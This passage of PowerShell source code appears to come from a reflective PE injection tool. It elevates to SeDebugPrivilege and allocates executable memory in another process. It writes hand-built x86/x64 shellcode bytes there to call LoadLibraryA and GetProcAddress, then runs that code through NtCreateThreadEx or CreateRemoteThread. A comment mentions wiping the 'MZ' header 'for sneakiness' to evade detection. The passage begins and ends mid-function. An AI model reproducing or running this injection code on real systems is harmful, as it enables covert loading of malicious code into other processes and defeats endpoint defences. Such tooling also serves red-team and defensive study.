		    if ($PsCmdlet.ParameterSetName -eq "Size")
		    {
			    [IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned ($StartAddress) ($Size))
		    }
		    else
		    {
			    $FinalEndAddress = $EndAddress
		    }
		
		    $PEEndAddress = $PEInfo.EndAddress
		
		    if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
		    {
			    Throw "Trying to write to memory smaller than allocated address range. $DebugString"
		    }
		    if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true)
		    {
			    Throw "Trying to write to memory greater than allocated address range. $DebugString"
		    }
	    }
	
	
	    Function Write-BytesToMemory
	    {
		    Param(
			    [Parameter(Position=0, Mandatory = $true)]
			    [Byte[]]
			    $Bytes,
			
			    [Parameter(Position=1, Mandatory = $true)]
			    [IntPtr]
			    $MemoryAddress
		    )
	
		    for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)
		    {
			    [System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])
		    }
	    }
	

	    #Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	    Function Get-DelegateType
	    {
	        Param
	        (
	            [OutputType([Type])]
	        
	            [Parameter( Position = 0)]
	            [Type[]]
	            $Parameters = (New-Object Type[](0)),
	        
	            [Parameter( Position = 1 )]
	            [Type]
	            $ReturnType = [Void]
	        )

	        $Domain = [AppDomain]::CurrentDomain
	        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
	        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
	        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
	        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
	        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
	        $MethodBuilder.SetImplementationFlags('Runtime, Managed')
	    
	        Write-Output $TypeBuilder.CreateType()
	    }


	    #Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	    Function Get-ProcAddress
	    {
	        Param
	        (
	            [OutputType([IntPtr])]
	    
	            [Parameter( Position = 0, Mandatory = $True )]
	            [String]
	            $Module,
	        
	            [Parameter( Position = 1, Mandatory = $True )]
	            [String]
	            $Procedure
	        )

	        # Get a reference to System.dll in the GAC
	        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
	            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
	        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
	        # Get a reference to the GetModuleHandle and GetProcAddress methods
	        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
	        $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
	        # Get a handle to the module specified
	        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
	        $tmpPtr = New-Object IntPtr
	        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

	        # Return the address of the function
	        Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
	    }
	
	
	    Function Enable-SeDebugPrivilege
	    {
		    Param(
		    [Parameter(Position = 1, Mandatory = $true)]
		    [System.Object]
		    $Win32Functions,
		
		    [Parameter(Position = 2, Mandatory = $true)]
		    [System.Object]
		    $Win32Types,
		
		    [Parameter(Position = 3, Mandatory = $true)]
		    [System.Object]
		    $Win32Constants
		    )
		
		    [IntPtr]$ThreadHandle = $Win32Functions.GetCurrentThread.Invoke()
		    if ($ThreadHandle -eq [IntPtr]::Zero)
		    {
			    Throw "Unable to get the handle to the current thread"
		    }
		
		    [IntPtr]$ThreadToken = [IntPtr]::Zero
		    [Bool]$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
		    if ($Result -eq $false)
		    {
			    $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			    if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
			    {
				    $Result = $Win32Functions.ImpersonateSelf.Invoke(3)
				    if ($Result -eq $false)
				    {
					    Throw "Unable to impersonate self"
				    }
				
				    $Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
				    if ($Result -eq $false)
				    {
					    Throw "Unable to OpenThreadToken."
				    }
			    }
			    else
			    {
				    Throw "Unable to OpenThreadToken. Error code: $ErrorCode"
			    }
		    }
		
		    [IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
		    $Result = $Win32Functions.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
		    if ($Result -eq $false)
		    {
			    Throw "Unable to call LookupPrivilegeValue"
		    }

		    [UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
		    [IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
		    $TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$Win32Types.TOKEN_PRIVILEGES)
		    $TokenPrivileges.PrivilegeCount = 1
		    $TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$Win32Types.LUID)
		    $TokenPrivileges.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
		    [System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)

		    $Result = $Win32Functions.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
		    $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value
		    if (($Result -eq $false) -or ($ErrorCode -ne 0))
		    {
			    #Throw "Unable to call AdjustTokenPrivileges. Return value: $Result, Errorcode: $ErrorCode"   #todo need to detect if already set
		    }
		
		    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)
	    }
	
	
	    Function Invoke-CreateRemoteThread
	    {
		    Param(
		    [Parameter(Position = 1, Mandatory = $true)]
		    [IntPtr]
		    $ProcessHandle,
		
		    [Parameter(Position = 2, Mandatory = $true)]
		    [IntPtr]
		    $StartAddress,
		
		    [Parameter(Position = 3, Mandatory = $false)]
		    [IntPtr]
		    $ArgumentPtr = [IntPtr]::Zero,
		
		    [Parameter(Position = 4, Mandatory = $true)]
		    [System.Object]
		    $Win32Functions
		    )
		
		    [IntPtr]$RemoteThreadHandle = [IntPtr]::Zero
		
		    $OSVersion = [Environment]::OSVersion.Version
		    #Vista and Win7
		    if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
		    {
			    Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
			    $RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
			    $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			    if ($RemoteThreadHandle -eq [IntPtr]::Zero)
			    {
				    Throw "Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError"
			    }
		    }
		    #XP/Win8
		    else
		    {
			    Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
			    $RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
		    }
		
		    if ($RemoteThreadHandle -eq [IntPtr]::Zero)
		    {
			    Write-Verbose "Error creating remote thread, thread handle is null"
		    }
		
		    return $RemoteThreadHandle
	    }

	

	    Function Get-ImageNtHeaders
	    {
		    Param(
		    [Parameter(Position = 0, Mandatory = $true)]
		    [IntPtr]
		    $PEHandle,
		
		    [Parameter(Position = 1, Mandatory = $true)]
		    [System.Object]
		    $Win32Types
		    )
		
		    $NtHeadersInfo = New-Object System.Object
		
		    #Normally would validate DOSHeader here, but we did it before this function was called and then destroyed 'MZ' for sneakiness
		    $dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)

		    #Get IMAGE_NT_HEADERS
		    [IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
		    $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
		    $imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)
		
		    #Make sure the IMAGE_NT_HEADERS checks out. If it doesn't, the data structure is invalid. This should never happen.
	        if ($imageNtHeaders64.Signature -ne 0x00004550)
	        {
	            throw "Invalid IMAGE_NT_HEADER signature."
	        }
		
		    if ($imageNtHeaders64.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
		    {
			    $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64
			    $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
		    }
		    else
		    {
			    $ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)
			    $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32
			    $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
		    }
		
		    return $NtHeadersInfo
	    }


	    #This function will get the information needed to allocated space in memory for the PE
	    Function Get-PEBasicInfo
	    {
		    Param(
		    [Parameter( Position = 0, Mandatory = $true )]
		    [Byte[]]
		    $PEBytes,
		
		    [Parameter(Position = 1, Mandatory = $true)]
		    [System.Object]
		    $Win32Types
		    )
		
		    $PEInfo = New-Object System.Object
		
		    #Write the PE to memory temporarily so I can get information from it. This is not it's final resting spot.
		    [IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
		    [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $UnmanagedPEBytes, $PEBytes.Length) | Out-Null
		
		    #Get NtHeadersInfo
		    $NtHeadersInfo = Get-ImageNtHeaders -PEHandle $UnmanagedPEBytes -Win32Types $Win32Types
		
		    #Build a structure with the information which will be needed for allocating memory and writing the PE to memory
		    $PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($NtHeadersInfo.PE64Bit)
		    $PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
		    $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		    $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
		    $PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
		
		    #Free the memory allocated above, this isn't where we allocate the PE to memory
		    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)
		
		    return $PEInfo
	    }


	    #PEInfo must contain the following NoteProperties:
	    #	PEHandle: An IntPtr to the address the PE is loaded to in memory
	    Function Get-PEDetailedInfo
	    {
		    Param(
		    [Parameter( Position = 0, Mandatory = $true)]
		    [IntPtr]
		    $PEHandle,
		
		    [Parameter(Position = 1, Mandatory = $true)]
		    [System.Object]
		    $Win32Types,
		
		    [Parameter(Position = 2, Mandatory = $true)]
		    [System.Object]
		    $Win32Constants
		    )
		
		    if ($PEHandle -eq $null -or $PEHandle -eq [IntPtr]::Zero)
		    {
			    throw 'PEHandle is null or IntPtr.Zero'
		    }
		
		    $PEInfo = New-Object System.Object
		
		    #Get NtHeaders information
		    $NtHeadersInfo = Get-ImageNtHeaders -PEHandle $PEHandle -Win32Types $Win32Types
		
		    #Build the PEInfo object
		    $PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PEHandle
		    $PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)
		    $PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)
		    $PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($NtHeadersInfo.PE64Bit)
		    $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		
		    if ($PEInfo.PE64Bit -eq $true)
		    {
			    [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
			    $PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		    }
		    else
		    {
			    [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
			    $PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		    }
		
		    if (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
		    {
			    $PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
		    }
		    elseif (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
		    {
			    $PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
		    }
		    else
		    {
			    Throw "PE file is not an EXE or DLL"
		    }
		
		    return $PEInfo
	    }
	
	
	    Function Import-DllInRemoteProcess
	    {
		    Param(
		    [Parameter(Position=0, Mandatory=$true)]
		    [IntPtr]
		    $RemoteProcHandle,
		
		    [Parameter(Position=1, Mandatory=$true)]
		    [IntPtr]
		    $ImportDllPathPtr
		    )
		
		    $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		    $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
		    $DllPathSize = [UIntPtr][UInt64]([UInt64]$ImportDllPath.Length + 1)
		    $RImportDllPathPtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		    if ($RImportDllPathPtr -eq [IntPtr]::Zero)
		    {
			    Throw "Unable to allocate memory in the remote process"
		    }

		    [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		    $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RImportDllPathPtr, $ImportDllPathPtr, $DllPathSize, [Ref]$NumBytesWritten)
		
		    if ($Success -eq $false)
		    {
			    Throw "Unable to write DLL path to remote process memory"
		    }
		    if ($DllPathSize -ne $NumBytesWritten)
		    {
			    Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		    }
		
		    $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
		    $LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "LoadLibraryA") #Kernel32 loaded to the same address for all processes
		
		    [IntPtr]$DllAddress = [IntPtr]::Zero
		    #For 64bit DLL's, we can't use just CreateRemoteThread to call LoadLibrary because GetExitCodeThread will only give back a 32bit value, but we need a 64bit address
		    #	Instead, write shellcode while calls LoadLibrary and writes the result to a memory address we specify. Then read from that memory once the thread finishes.
		    if ($PEInfo.PE64Bit -eq $true)
		    {
			    #Allocate memory for the address returned by LoadLibraryA
			    $LoadLibraryARetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			    if ($LoadLibraryARetMem -eq [IntPtr]::Zero)
			    {
				    Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
			    }
			
			
			    #Write Shellcode to the remote process which will call LoadLibraryA (Shellcode: LoadLibraryA.asm)
			    $LoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			    $LoadLibrarySC2 = @(0x48, 0xba)
			    $LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)
			    $LoadLibrarySC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
			
			    $SCLength = $LoadLibrarySC1.Length + $LoadLibrarySC2.Length + $LoadLibrarySC3.Length + $LoadLibrarySC4.Length + ($PtrSize * 3)
			    $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
			    $SCPSMemOriginal = $SCPSMem
			
			    Write-BytesToMemory -Bytes $LoadLibrarySC1 -MemoryAddress $SCPSMem
			    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC1.Length)
			    [System.Runtime.InteropServices.Marshal]::StructureToPtr($RImportDllPathPtr, $SCPSMem, $false)
			    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			    Write-BytesToMemory -Bytes $LoadLibrarySC2 -MemoryAddress $SCPSMem
			    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC2.Length)
			    [System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryAAddr, $SCPSMem, $false)
			    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			    Write-BytesToMemory -Bytes $LoadLibrarySC3 -MemoryAddress $SCPSMem
			    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC3.Length)
			    [System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryARetMem, $SCPSMem, $false)
			    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			    Write-BytesToMemory -Bytes $LoadLibrarySC4 -MemoryAddress $SCPSMem
			    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC4.Length)

			
			    $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			    if ($RSCAddr -eq [IntPtr]::Zero)
			    {
				    Throw "Unable to allocate memory in the remote process for shellcode"
			    }
			
			    $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
			    if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
			    {
				    Throw "Unable to write shellcode to remote process memory."
			    }
			
			    $RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
			    $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			    if ($Result -ne 0)
			    {
				    Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			    }
			
			    #The shellcode writes the DLL address to memory in the remote process at address $LoadLibraryARetMem, read this memory
			    [IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
			    $Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $LoadLibraryARetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
			    if ($Result -eq $false)
			    {
				    Throw "Call to ReadProcessMemory failed"
			    }
			    [IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

			    $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $LoadLibraryARetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			    $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		    }
		    else
		    {
			    [IntPtr]$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions
			    $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			    if ($Result -ne 0)
			    {
				    Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			    }
			
			    [Int32]$ExitCode = 0
			    $Result = $Win32Functions.GetExitCodeThread.Invoke($RThreadHandle, [Ref]$ExitCode)
			    if (($Result -eq 0) -or ($ExitCode -eq 0))
			    {
				    Throw "Call to GetExitCodeThread failed"
			    }
			
			    [IntPtr]$DllAddress = [IntPtr]$ExitCode
		    }
		
		    $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RImportDllPathPtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		
		    return $DllAddress
	    }
	
	
	    Function Get-RemoteProcAddress
	    {
		    Param(
		    [Parameter(Position=0, Mandatory=$true)]
		    [IntPtr]
		    $RemoteProcHandle,
		
		    [Parameter(Position=1, Mandatory=$true)]
		    [IntPtr]
		    $RemoteDllHandle,
		
		    [Parameter(Position=2, Mandatory=$true)]
		    [String]
		    $FunctionName
		    )

		    $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		    $FunctionNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($FunctionName)
		
		    #Write FunctionName to memory (will be used in GetProcAddress)
		    $FunctionNameSize = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
		    $RFuncNamePtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $FunctionNameSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		    if ($RFuncNamePtr -eq [IntPtr]::Zero)
		    {
			    Throw "Unable to allocate memory in the remote process"
		    }

		    [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		    $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RFuncNamePtr, $FunctionNamePtr, $FunctionNameSize, [Ref]$NumBytesWritten)
		    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($FunctionNamePtr)
		    if ($Success -eq $false)
		    {
			    Throw "Unable to write DLL path to remote process memory"
		    }
		    if ($FunctionNameSize -ne $NumBytesWritten)
		    {
			    Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		    }
		
		    #Get address of GetProcAddress
		    $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
		    $GetProcAddressAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "GetProcAddress") #Kernel32 loaded to the same address for all processes

		
		    #Allocate memory for the address returned by GetProcAddress
		    $GetProcAddressRetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UInt64][UInt64]$PtrSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		    if ($GetProcAddressRetMem -eq [IntPtr]::Zero)
		    {
			    Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
		    }
		
		
		    #Write Shellcode to the remote process which will call GetProcAddress
		    #Shellcode: GetProcAddress.asm
		    #todo: need to have detection for when to get by ordinal
		    [Byte[]]$GetProcAddressSC = @()
		    if ($PEInfo.PE64Bit -eq $true)
		    {
			    $GetProcAddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			    $GetProcAddressSC2 = @(0x48, 0xba)
			    $GetProcAddressSC3 = @(0x48, 0xb8)
			    $GetProcAddressSC4 = @(0xff, 0xd0, 0x48, 0xb9)
			    $GetProcAddressSC5 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
		    }
		    else
		    {
			    $GetProcAddressSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
			    $GetProcAddressSC2 = @(0xb9)
			    $GetProcAddressSC3 = @(0x51, 0x50, 0xb8)
			    $GetProcAddressSC4 = @(0xff, 0xd0, 0xb9)
			    $GetProcAddressSC5 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
		    }
		    $SCLength = $GetProcAddressSC1.Length + $GetProcAddressSC2.Length + $GetProcAddressSC3.Length + $GetProcAddressSC4.Length + $GetProcAddressSC5.Length + ($PtrSize * 4)
		    $SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
		    $SCPSMemOriginal = $SCPSMem
		
		    Write-BytesToMemory -Bytes $GetProcAddressSC1 -MemoryAddress $SCPSMem
		    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC1.Length)
		    [System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteDllHandle, $SCPSMem, $false)
		    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		    Write-BytesToMemory -Bytes $GetProcAddressSC2 -MemoryAddress $SCPSMem
		    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC2.Length)
		    [System.Runtime.InteropServices.Marshal]::StructureToPtr($RFuncNamePtr, $SCPSMem, $false)
		    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		    Write-BytesToMemory -Bytes $GetProcAddressSC3 -MemoryAddress $SCPSMem
		    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC3.Length)
		    [System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressAddr, $SCPSMem, $false)
		    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		    Write-BytesToMemory -Bytes $GetProcAddressSC4 -MemoryAddress $SCPSMem
		    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC4.Length)
		    [System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressRetMem, $SCPSMem, $false)
		    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		    Write-BytesToMemory -Bytes $GetProcAddressSC5 -MemoryAddress $SCPSMem
		    $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC5.Length)
		
		    $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
		    if ($RSCAddr -eq [IntPtr]::Zero)
		    {
			    Throw "Unable to allocate memory in the remote process for shellcode"
		    }
		
		    $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
		    if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
		    {
			    Throw "Unable to write shellcode to remote process memory."
		    }
		
		    $RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
		    $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
		    if ($Result -ne 0)
		    {
			    Throw "Call to CreateRemoteThread to call GetProcAddress failed."
		    }
		
